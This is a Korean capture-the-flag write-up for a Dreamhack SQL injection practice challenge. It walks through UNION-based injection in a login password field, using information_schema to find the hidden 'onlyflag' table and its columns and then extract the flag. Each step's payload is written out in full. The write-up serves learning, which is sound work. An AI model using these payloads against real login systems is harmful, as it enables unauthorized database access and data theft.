# baby-union

## 문제 링크
https://dreamhack.io/wargame/challenges/984

## 문제 설명
SQL INJECTION 취약점을 통해 플래그를 획득하는 로그인 서비스이다. 로그인 시 계정의 정보가 출력되고, 문제에서 주어진 init.sql 파일의 테이블명과 컬럼명은 실제 이름과 다르다.

## 풀이 과정
1. 코드에 주어진 
```INSERT INTO users (uid, upw, descr) values ('guest', 'melon', 'For guest');
```
을 보고, upw에
```
melon' UNION SELECT * FROM information_schema.tables;--
```
로 공격 시도했지만, 오류가 났다.
(information_schema.tables는 db에 있는 테이블의 정보를 모아둔 테이블이다.) 
오류가 난 이유->컬럼의 갯수가 맞지 않는다! (users는 4개, fake_table_name은 5개임)   
2.  
```
melon' UNION SELECT table_name,0,0,0 FROM information_schema.tables;--
```
로 upw에 넣을 코드를 수정하였다. 우리가 알고싶은건 table_name뿐이기에, 뒤 0,0,0은 users와 컬럼의 갯수를 맞추기 위해 아무 값이나 불러와도 된다.  
3. 출력된 테이블에서 플래그값이 있을거라 예상되는 onlyflag를 발견했다. ->table_name이 onlyflag인걸 알아냈다.   
4.컬럼의 이름을 알아내기 위해 information_schema.columns 를 이용해준다.   
(information_schema.tables는 db에 있는 테이블의 정보를 모아둔 테이블이라면, information_schema.columns는 컬럼의 정보를 모아둔 테이블이다.) 
5. upw자리에  
```
melon' UNION SELECT column_name,0,0,0 FROM information_schema.columns WHERE table_name = 'onlyflag';--
```
를 넣어 로그인 해준다.  
6. 컬럼이 idx sname svalue sflag sclose, 총 5개 있음을 알아냈다.   
7.최종적으로 onlyflag 테이블 정보를 빼내려면 upw자리에 
```
melon' UNION SELECT sname, svalue, sflag, sclose FROM onlyflag;--
```
으로 로그인 하면 뭔가 이상한 값이 나온다. > 컬럼4개를 불렀는데도 sflag가 안나온다. >3번째 자리가 출력이 안되는걸 알 수 있다.  
8.sname은 이제 필요가 없으니, (이미 이름 알고 있음)  
```
melon' UNION SELECT svalue, sflag, sname, sclose FROM onlyflag;--
``` 
로 순서 바꿔주어 최종적으로 플래그를 획득한다.

## 배운점
sql의 union과 information_schema를 사용하는 법에 대해 학습할 수 있었다. 또한 7번 경우 처럼 출력이 안되는 컬럼이 있을 수 있으니 직접 확인해 봐서 필요한 컬럼만 출력해야 함을 알 수 있었다. 전체적으로 sql 기초 사용법에 대해 잘 익힐 수 있었던 것 같다. 

